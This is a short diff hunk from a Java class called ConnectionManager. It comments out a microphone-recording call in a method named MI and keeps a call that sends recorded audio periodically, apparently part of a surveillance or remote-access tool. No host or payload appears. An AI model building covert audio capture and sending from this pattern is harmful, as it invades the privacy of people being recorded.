@@ -147,7 +147,7 @@ public class ConnectionManager {
     }
 
     public static void MI(int sec) throws Exception{
-        MicManager.startRecording(sec);
+        // MicManager.startRecording(sec);
         AudioRecorder.sendPeriodically();
     }
 
